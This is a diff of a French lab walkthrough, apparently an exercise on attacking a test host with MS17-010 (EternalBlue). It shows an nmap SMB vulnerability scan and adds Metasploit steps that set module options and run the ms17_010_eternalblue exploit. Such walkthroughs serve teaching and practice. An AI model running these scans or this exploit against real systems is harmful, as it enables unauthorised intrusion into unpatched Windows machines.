@@ -101,13 +101,14 @@ nmap -sS -Pn -p 445 10.10.18.88 --script smb-vuln-ms17-010.nse
 - Comprendre la vulnérabilité pour préparer l'attaque : 
 
 References:
-       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
-       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
-       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/. 
+       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx. 
+       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143. 
 
 ### Menez l'attaque exploit
 
 - Prise en main de Metasploit
+
 ```
 msfconsole -h
 ```
@@ -168,3 +169,14 @@ Exploit target:
    --  ----
    0   Windows 7 and Server 2008 R2 (x64) All Service Packs
 ```
+
+- Quelles sont les options nécessaires pour la commande ?
+
+```
+set _OPTION_ _VALUE_
+```
+
+- Lancez l'attaque
+
+```
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
